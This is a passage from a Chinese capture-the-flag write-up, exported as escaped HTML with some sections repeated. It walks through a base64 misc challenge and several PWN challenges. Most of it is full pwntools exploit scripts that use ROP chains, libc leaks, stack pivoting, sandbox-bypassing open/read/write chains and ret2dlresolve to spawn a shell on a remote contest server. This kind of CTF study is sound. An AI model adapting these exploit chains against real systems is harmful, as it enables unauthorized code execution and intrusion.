gdb.attach(p)</span><br><span class=\"line\">func_addr=elf.got[&#x27;setvbuf&#x27;]</span><br><span class=\"line\">syscall_ret=0x4012ec</span><br><span class=\"line\">pop_rdi=0x401363</span><br><span class=\"line\">pop_rsi2=0x401361</span><br><span class=\"line\"> </span><br><span class=\"line\">p.sendline(&quot;000&quot;)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*0x78+p64(pop_rdi)+p64(1)+p64(pop_rsi2)+p64(func_addr)+p64(0xdeadfeef)+p64(0x401291)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.recvuntil(b&#x27;./f1ag&#x27;)</span><br><span class=\"line\">p.recv(2)</span><br><span class=\"line\"># p.recvuntil(b&#x27;./f1ag\\x00\\x00\\x00&#x27;)</span><br><span class=\"line\">func_addr=u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))</span><br><span class=\"line\">base=func_addr-libc.symbols[&#x27;setvbuf&#x27;]</span><br><span class=\"line\">print(hex(func_addr))</span><br><span class=\"line\">print(hex(base))</span><br><span class=\"line\">system_addr=base+libc.symbols[&#x27;system&#x27;]</span><br><span class=\"line\">printf_addr=base+libc.symbols[&#x27;printf&#x27;]</span><br><span class=\"line\">sh=base+next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class=\"line\">open64_addr=base+libc.symbols[&#x27;open64&#x27;]</span><br><span class=\"line\"> </span><br><span class=\"line\">flag_name=0x4040e0</span><br><span class=\"line\">pop_rdx=0x142c92+base</span><br><span class=\"line\">pop_rsi=0x2601f+base</span><br><span class=\"line\">pop_rax=0x36174+base</span><br><span class=\"line\"> </span><br><span class=\"line\">payload=b&#x27;flag\\x00\\x00\\x00\\x00&#x27;</span><br><span class=\"line\">pause()</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"> </span><br><span class=\"line\">payload=b&#x27;a&#x27;*0x78+p64(pop_rax)+p64(2)+p64(pop_rdi)+p64(flag_name)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(pop_rsi)+p64(0)+p64(syscall_ret)+p64(pop_rax)+p64(0)+p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(flag_name+0x20)+p64(pop_rdx)+p64(0x30)+p64(syscall_ret)+p64(pop_rax)+p64(1)+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(flag_name+0x20)+p64(pop_rdx)+p64(0x30)+p64(syscall_ret)+p64(0x401270)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"> </span><br><span class=\"line\">p.interactive(0)</span><br><span class=\"line\"> </span><br><span class=\"line\"># 0x000000000040135c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040135e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x0000000000401360 : pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x0000000000401362 : pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040135b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040135f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040119d : pop rbp ; ret</span><br><span class=\"line\"># 0x0000000000401363 : pop rdi ; ret</span><br><span class=\"line\"># 0x0000000000401361 : pop rsi ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040135d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040101a : ret</span><br><span class=\"line\"># 0x000000000040127e : ret 0x14</span><br><span class=\"line\"># 0x00000000004012e7 : ret 0x200</span><br><span class=\"line\"> </span><br><span class=\"line\"># 0x00000000004012ba : ret 0x4c</span><br><span class=\"line\"># 0x000000000040129c : ret 0x50</span><br><span class=\"line\"># offset in libc</span><br><span class=\"line\"># 0x0000000000036174 : pop rax ; ret</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"close\"><a href=\"#close\" class=\"headerlink\" title=\"close\"></a>close</h3><p>Q:你leak不了一点！hacker！！<br>A:？？？？？？<br>依旧是栈溢出，这次没有沙箱了。但是把标准输出关闭了。这意味着我们需要把标准输出重定向才能获得flag<br><img src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/3dis1.png\"><br>既然我们在get shell之前没办法获得任何输出，那么我们必须采用一种不依赖于泄露东西的方法。<br>于是毋庸置疑，关于泄露libc地址的方法直接一票否决了。<br>于是考虑使用ret2dlresolve来调用shell。<br>这里使用生成的payload<br>原本是想用system(“&#x2F;bin&#x2F;sh”)的，但是发现system好像有些神秘问题导致显示：<br><img src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/3problem.png\"><br>于是采用execve(“&#x2F;bin&#x2F;sh”,0,0)来获取shell<br>但是由于没有直接pop rdx的gadget，我们使用csu来进行rdx的修改。（注意这里面的call和判断,标记起来了）：<br><img src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/3csu.png\"><br>所以我们先把想要的rdx的值pop到r14里面，然后返回到0x4012300那里，把r14赋给rdx。这里绕过判断就是让rbx和rbp值相等。这里多调试几下就OK了<br>之后就get到shell了。这时候我们要把标准输出重定向到标准错误里面，即exec 1&gt;&amp;2<br>hint:网上关于标准输出被关闭的情况，有教程：exec 1&gt;&amp;0。但是似乎ubuntu 20不太好使。 可以选择把输出重定向给标准错误（2）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\">context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class=\"line\">context.binary = elf = ELF(&quot;./pwn&quot;)</span><br><span class=\"line\">rop = ROP(context.binary)</span><br><span class=\"line\">dlresolve = Ret2dlresolvePayload(elf,symbol=&quot;execve&quot;,args=[&quot;/bin/sh&quot;,0])</span><br><span class=\"line\">rop.read(0,dlresolve.data_addr)</span><br><span class=\"line\">rop.ret2dlresolve(dlresolve)</span><br><span class=\"line\">raw_rop = rop.chain()</span><br><span class=\"line\"># io = process(&quot;./pwn&quot;)</span><br><span class=\"line\"># io=process([&#x27;./ld-linux-x86-64.so.2&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;./libc.so.6&#x27;&#125;)</span><br><span class=\"line\"># io=process([&#x27;./ld-2.31.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;./libc-2.31.so&#x27;&#125;)</span><br><span class=\"line\">io=remote(&#x27;8.130.110.158&#x27;,7001)</span><br><span class=\"line\"># gdb.attach(io)</span><br><span class=\"line\">payload0 = flat(&#123;0x98:raw_rop&#125;)</span><br><span class=\"line\">io.sendlineafter(&#x27;name&#x27;,&quot;fuck&quot;)</span><br><span class=\"line\">payload1=b&#x27;a&#x27;*0x90+p64(0x404e90)+p64(0x40127c)</span><br><span class=\"line\">io.sendlineafter(&#x27;response&#x27;,payload1)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">io.sendline(dlresolve.payload.ljust(0x90,b&#x27;\\x00&#x27;)+p64(0x404ff0)+p64(0x401323)+p64(0x402018)+p64(0x40131a)+p64(0)+p64(1)+p64(0x402018)+p64(0)+p64(0)+p64(elf.got[&#x27;alarm&#x27;])+p64(0x401300)+p64(0x404e90)+p64(0x404ff0)+p64(0x401230)+p64(0)+p64(0)+p64(0)+raw_rop[40:])</span><br><span class=\"line\"># pause()</span><br><span class=\"line\"># io.sendline(dlresolve.payload)</span><br><span class=\"line\"># io=remote(&#x27;8.130.110.158&#x27;,7001)</span><br><span class=\"line\">io.sendline(b&quot;exec 1&gt;&amp;2&quot;)</span><br><span class=\"line\">io.sendline(b&quot;ls&quot;)</span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"> </span><br><span class=\"line\"># 0x404e90</span><br><span class=\"line\"># 0x000000000040131c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040131e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x0000000000401320 : pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x0000000000401322 : pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040131b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040131f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x00000000004011bd : pop rbp ; ret</span><br><span class=\"line\"># 0x0000000000401323 : pop rdi ; ret</span><br><span class=\"line\"># 0x0000000000401321 : pop rsi ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040131d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040101a : ret</span><br></pre></td></tr></table></figure>\n","excerpt":"","more":"<p>markdown出问题的话直接看链接：<a href=\"https://zcoi.github.io/blogs/CTF/monthgame2310/\">https://zcoi.github.io/blogs/CTF/monthgame2310/</a></p>\n<h1 id=\"解题情况\"><a href=\"#解题情况\" class=\"headerlink\" title=\"解题情况\"></a>解题情况</h1><p><img src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/self1.png\"><br><img src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/self2.png\"><br><img src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/misc.png\"><br><img src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/web.png\"><br><img src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/pwn.png\"><br><img src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/cry.png\"></p>\n<h1 id=\"解题思路\"><a href=\"#解题思路\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h1><h2 id=\"Misc\"><a href=\"#Misc\" class=\"headerlink\" title=\"Misc\"></a>Misc</h2><h3 id=\"level1-Login\"><a href=\"#level1-Login\" class=\"headerlink\" title=\"level1-Login\"></a>level1-Login</h3><p>直接看html，发现base64加密的一串。直接解密就是flag</p>\n<h2 id=\"PWN\"><a href=\"#PWN\" class=\"headerlink\" title=\"PWN\"></a>PWN</h2><h3 id=\"ret2libc\"><a href=\"#ret2libc\" class=\"headerlink\" title=\"ret2libc\"></a>ret2libc</h3><p>Q:请嗯造libc<br>A:我嗯造libc</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import*</span><br><span class=\"line\">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\">context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class=\"line\">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class=\"line\">libc=ELF(&#x27;./libc-2.31.so&#x27;)</span><br><span class=\"line\"># p=process(&#x27;./pwn&#x27;)</span><br><span class=\"line\"># p=process([&#x27;./ld-2.31.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;./libc-2.31.so&#x27;&#125;)</span><br><span class=\"line\"># gdb.attach(p)</span><br><span class=\"line\">p=remote(&#x27;8.130.110.158&#x27;,2110)</span><br><span class=\"line\"> </span><br><span class=\"line\">func_addr=elf.got[&#x27;write&#x27;]</span><br><span class=\"line\">write_addr=elf.plt[&#x27;write&#x27;]</span><br><span class=\"line\"> </span><br><span class=\"line\">pop_rdi=0x4012a3</span><br><span class=\"line\">pop_rsi2=0x4012a1</span><br><span class=\"line\">ret=0x40101a</span><br><span class=\"line\">vuln=0x4011db</span><br><span class=\"line\"> </span><br><span class=\"line\">payload= b&#x27;a&#x27;*0x10+p64(pop_rdi)+p64(1)+p64(pop_rsi2)+p64(func_addr)+p64(0xdeadbeef)+p64(write_addr)+p64(vuln)</span><br><span class=\"line\">p.sendlineafter(&#x27;voice :&#x27;,payload)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\">func_addr=u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))</span><br><span class=\"line\">base=func_addr-libc.symbols[&#x27;write&#x27;]</span><br><span class=\"line\">system_addr=base+libc.symbols[&#x27;system&#x27;]</span><br><span class=\"line\">printf_addr=base+libc.symbols[&#x27;printf&#x27;]</span><br><span class=\"line\">sh=base+next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class=\"line\"> </span><br><span class=\"line\">pause()</span><br><span class=\"line\">payload=b&#x27;a&#x27;*0x10+p64(pop_rdi)+p64(sh)+p64(system_addr)+p64(vuln)</span><br><span class=\"line\">p.sendlineafter(&#x27;voice :&#x27;,payload)</span><br><span class=\"line\"> </span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"> </span><br><span class=\"line\"># 0x000000000040129c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040129e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x00000000004012a0 : pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x00000000004012a2 : pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040129b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040129f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040115d : pop rbp ; ret</span><br><span class=\"line\"># 0x00000000004012a3 : pop rdi ; ret</span><br><span class=\"line\"># 0x00000000004012a1 : pop rsi ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040129d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040101a : ret</span><br></pre></td></tr></table></figure>\n<h3 id=\"Stack-Migration\"><a href=\"#Stack-Migration\" class=\"headerlink\" title=\"Stack_Migration\"></a>Stack_Migration</h3><p>字面意思，栈可以到处跑<br>正常审题程序不再罗列（checksec、IDA看字符串啥的）。<br>IDA中发现有沙箱<br><img src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/1dis1.png\"><br><img src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/1seccomp.png\"><br>依旧是发现栈溢出。<br><img src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/1dis2.png\"><br>考虑到没法直接执行shellcode，因此只能构建ROP链。实现以下功能：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">char*file=&#x27;flag&#x27;;</span><br><span class=\"line\">open(file,0,0);</span><br><span class=\"line\">read(3,file,0x30);</span><br><span class=\"line\">write(1,file,0x30);</span><br></pre></td></tr></table></figure>\n<p>这里把存储flag文件的名称和栈迁移之后的ROP链一起读入到bss那里。毕竟空间充足。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import*</span><br><span class=\"line\">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\">context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class=\"line\">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class=\"line\">libc=ELF(&#x27;./libc-2.31.so&#x27;)</span><br><span class=\"line\">p=remote(&#x27;8.130.110.158&#x27;,2109)</span><br><span class=\"line\"># p=process(&#x27;./pwn&#x27;)</span><br><span class=\"line\"># p=process([&#x27;./ld-2.31.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;./libc-2.31.so&#x27;&#125;)</span><br><span class=\"line\"># gdb.attach(p)</span><br><span class=\"line\"> </span><br><span class=\"line\">bss_st=0x4040A0</span><br><span class=\"line\">bss_tar=0x4040A0+0x200</span><br><span class=\"line\">flag_name=0x4040a0+0x200-8</span><br><span class=\"line\">flag_addr=bss_st+0x300-0x40</span><br><span class=\"line\"> </span><br><span class=\"line\">pop_rdi=0x401373</span><br><span class=\"line\">pop_rsi2=0x401371</span><br><span class=\"line\">leave=0x4012e6</span><br><span class=\"line\"> </span><br><span class=\"line\">func_addr=elf.got[&#x27;read&#x27;]</span><br><span class=\"line\">write_addr=elf.plt[&#x27;write&#x27;]</span><br><span class=\"line\">read_addr=elf.plt[&#x27;read&#x27;]</span><br><span class=\"line\">vuln=0x401279</span><br><span class=\"line\"> </span><br><span class=\"line\">payload1=b&#x27;a&#x27;*(0x200-0x8)+b&#x27;flag\\x00\\x00\\x00\\x00&#x27;+p64(bss_tar+0x100)+p64(pop_rdi)+p64(1)+p64(pop_rsi2)+p64(func_addr)+p64(0xdeadfeef)+p64(write_addr)+p64(0x4012a3)</span><br><span class=\"line\">p.sendlineafter(&#x27;everywhere&#x27;,payload1)</span><br><span class=\"line\"> </span><br><span class=\"line\">migr_pay=b&#x27;a&#x27;*0x8+p64(bss_tar)+p64(leave)</span><br><span class=\"line\">p.sendafter(&#x27;voice :&#x27;,migr_pay)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\">func_addr=u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))</span><br><span class=\"line\">base=func_addr-libc.symbols[&#x27;read&#x27;]</span><br><span class=\"line\">print(hex(base))</span><br><span class=\"line\">system_addr=base+libc.symbols[&#x27;system&#x27;]</span><br><span class=\"line\">printf_addr=base+libc.symbols[&#x27;printf&#x27;]</span><br><span class=\"line\">sh=base+next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class=\"line\">open64_addr=base+libc.symbols[&#x27;open64&#x27;]</span><br><span class=\"line\"> </span><br><span class=\"line\">pop_rdx=0x142c92+base</span><br><span class=\"line\">pop_rsi=0x2601f+base</span><br><span class=\"line\">pause()</span><br><span class=\"line\">payload2=p64(bss_st+0x100)+p64(pop_rdi)+p64(flag_name)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(open64_addr)+p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(flag_addr)+p64(pop_rdx)+p64(0x30)+p64(read_addr)</span><br><span class=\"line\">payload2+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(flag_addr)+p64(pop_rdx)+p64(0x30)+p64(write_addr)+p64(vuln)</span><br><span class=\"line\">p.sendline(payload2)</span><br><span class=\"line\"> </span><br><span class=\"line\">migr_pay=b&#x27;a&#x27;*0x8+p64(bss_st)+p64(leave)</span><br><span class=\"line\">p.sendafter(&#x27;voice :&#x27;,migr_pay)</span><br><span class=\"line\"> </span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"> </span><br><span class=\"line\"># 0x000000000040136c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040136e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x0000000000401370 : pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x0000000000401372 : pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040136b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040136f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x00000000004011bd : pop rbp ; ret</span><br><span class=\"line\"># 0x0000000000401373 : pop rdi ; ret</span><br><span class=\"line\"># 0x0000000000401371 : pop rsi ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040136d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040101a : ret</span><br><span class=\"line\"># 0x000000000040121a : ret 0xfffe</span><br><span class=\"line\"> </span><br><span class=\"line\"># in libc</span><br><span class=\"line\"># 0x0000000000142c92 : pop rdx ; ret</span><br><span class=\"line\"># 0x000000000002601f : pop rsi ; ret</span><br></pre></td></tr></table></figure>\n<h3 id=\"call-me-sys\"><a href=\"#call-me-sys\" class=\"headerlink\" title=\"call me sys\"></a>call me sys</h3><p>syscall，但是只能用几个函数<br>又是沙箱：<br><img src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/2dis1.png\"><br><img src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/2seccomp.png\"><br>还是栈溢出漏洞：<br><img src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/2dis2.png\"><br>由于没有关掉open,write,read函数，所以这题思路和上题一样。（题目说有三种方法，日后钻研）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import*</span><br><span class=\"line\"> </span><br><span class=\"line\">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\">context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class=\"line\">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class=\"line\">libc=ELF(&#x27;./libc-2.31.so&#x27;)</span><br><span class=\"line\">p=remote(&#x27;8.130.110.158&#x27;,2111)</span><br><span class=\"line\"># p=process(&#x27;./pwn&#x27;)</span><br><span class=\"line\"># p=process([&#x27;./ld-2.31.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;./libc-2.31.so&#x27;&#125;)</span><br><span class=\"line\"># gdb.attach(p)</span><br><span class=\"line\">func_addr=elf.got[&#x27;setvbuf&#x27;]</span><br><span class=\"line\">syscall_ret=0x4012ec</span><br><span class=\"line\">pop_rdi=0x401363</span><br><span class=\"line\">pop_rsi2=0x401361</span><br><span class=\"line\"> </span><br><span class=\"line\">p.sendline(&quot;000&quot;)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*0x78+p64(pop_rdi)+p64(1)+p64(pop_rsi2)+p64(func_addr)+p64(0xdeadfeef)+p64(0x401291)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.recvuntil(b&#x27;./f1ag&#x27;)</span><br><span class=\"line\">p.recv(2)</span><br><span class=\"line\"># p.recvuntil(b&#x27;./f1ag\\x00\\x00\\x00&#x27;)</span><br><span class=\"line\">func_addr=u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))</span><br><span class=\"line\">base=func_addr-libc.symbols[&#x27;setvbuf&#x27;]</span><br><span class=\"line\">print(hex(func_addr))</span><br><span class=\"line\">print(hex(base))</span><br><span class=\"line\">system_addr=base+libc.symbols[&#x27;system&#x27;]</span><br><span class=\"line\">printf_addr=base+libc.symbols[&#x27;printf&#x27;]</span><br><span class=\"line\">sh=base+next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class=\"line\">open64_addr=base+libc.symbols[&#x27;open64&#x27;]</span><br><span class=\"line\"> </span><br><span class=\"line\">flag_name=0x4040e0</span><br><span class=\"line\">pop_rdx=0x142c92+base</span><br><span class=\"line\">pop_rsi=0x2601f+base</span><br><span class=\"line\">pop_rax=0x36174+base</span><br><span class=\"line\"> </span><br><span class=\"line\">payload=b&#x27;flag\\x00\\x00\\x00\\x00&#x27;</span><br><span class=\"line\">pause()</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"> </span><br><span 